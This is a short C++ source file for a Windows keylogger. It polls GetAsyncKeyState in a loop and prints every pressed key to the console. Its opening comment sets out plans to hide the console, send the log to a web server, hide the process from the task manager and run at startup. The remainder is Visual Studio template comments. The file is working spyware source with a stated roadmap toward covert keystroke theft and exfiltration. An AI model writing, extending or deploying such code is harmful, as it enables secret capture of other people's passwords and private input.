// Things to implement: no console shown, send log to web server, not shown in task manager, start at startup
// automaticallly, 'backspace' instead of logged, removes last char from log, symbols/shift/ctrl should be recorded,
// currently everything is uppercase

#include <Windows.h>
#include <WinUser.h>
#include <iostream>
#include <chrono>
#include <thread>

constexpr bool isMSBSet(SHORT n) { // SHORT is 2 bytes
	return (n >> 15) & 1;
}

constexpr bool isLSBSet(SHORT n) {
	return n & 1;
}

int main()
{
	while (true) {
		std::this_thread::sleep_for(std::chrono::milliseconds(25)); // sleeps for 25 ms
		for (auto i = 1; i < 255; ++i) {
			SHORT n = GetAsyncKeyState(i);
			if (isMSBSet(n) && isLSBSet(n)) {
				std::cout << static_cast<char>(MapVirtualKeyW(i, MAPVK_VK_TO_CHAR)) << ' ';
			}
		}
	}
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
